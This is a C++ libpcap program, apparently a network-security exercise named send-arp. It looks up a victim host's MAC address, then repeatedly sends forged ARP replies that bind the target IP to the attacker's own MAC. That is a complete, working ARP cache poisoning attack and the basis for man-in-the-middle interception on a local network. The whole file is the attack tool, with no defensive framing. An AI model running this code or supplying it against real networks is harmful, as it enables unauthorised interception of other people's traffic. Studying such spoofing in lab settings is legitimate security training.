#include <cstdio>
#include <pcap.h>

#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"

// https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
// https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_may_ip(char* dev, char* _ip)
{
	int fd;
	struct ifreq ifr;
	

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short), _ip, sizeof(struct sockaddr));

	return;
}

void get_my_mac(char* dev, char* _mac)
{
	int fd;
	char* mac;

	struct ifreq ifr;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name , dev , IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (char *)ifr.ifr_hwaddr.sa_data;
	sprintf(_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", mac[0]&0xff, mac[1]&0xff, mac[2]&0xff, mac[3]&0xff, mac[4]&0xff, mac[5]&0xff);

	return;
}

int send_arp(pcap_t* handle, Mac ether_dMac, Mac ether_sMac, uint16_t opcode, Mac arp_sMac, Ip sIp, Mac arp_dMac, Ip dIp)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = ether_dMac;
	packet.eth_.smac_ = ether_sMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	// packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.op_ = htons(opcode);
	packet.arp_.smac_ = arp_sMac;
	packet.arp_.sip_ = htonl(sIp);
	packet.arp_.tmac_ = arp_dMac;
	packet.arp_.tip_ = htonl(dIp);

	return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Ip sender_ip = Ip(argv[2]);
	Ip target_ip = Ip(argv[3]);

	Mac sender_mac;

	char my_ip[16]; 
	char my_mac[32];
	get_may_ip(dev, my_ip);
	get_my_mac(dev, my_mac);

	// printf("my ip : %s\n",my_ip);
	// printf("MAC : %s\n", my_mac);
	
	int res = send_arp(handle, Mac("ff:ff:ff:ff:ff:ff"), Mac(my_mac), ArpHdr::Request,
					   Mac(my_mac), Ip(my_ip), Mac("00:00:00:00:00:00"), Ip(sender_ip));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	EthArpPacket *etharp;

  	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		if (packet == NULL) continue;
        
		etharp = (EthArpPacket *) packet;
		if(etharp->eth_.type() != EthHdr::Arp) continue;

		if(etharp->arp_.hrd() != ArpHdr::ETHER || etharp->arp_.pro() != EthHdr::Ip4 || etharp->arp_.op() != ArpHdr::Reply) {
			continue;
		}

		if(Mac(my_mac) == etharp->arp_.tmac() && Ip(my_ip) == etharp->arp_.tip() && Ip(sender_ip) == etharp->arp_.sip()) {
			
			printf("good\n");
			// printf("hrd : %d\n",etharp->arp_.hrd());
			// printf("pro : %d\n",etharp->arp_.pro());
			// printf("op : %d\n",etharp->arp_.op());

			printf("my mac: %s\n", my_mac);
			
			break;
		}
		else
		{
			printf("not_good\n");
		}
	}
	sender_mac = etharp->arp_.smac();
	printf("caught sender's mac address\n");

	for(int i = 0; i < 5; i++)
	{
		res = send_arp(handle, sender_mac, Mac(my_mac), ArpHdr::Reply, Mac(my_mac), 
						Ip(target_ip), Mac(sender_mac), Ip(sender_ip));
		
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}

	printf("Done~~!!\n");

	pcap_close(handle);
}
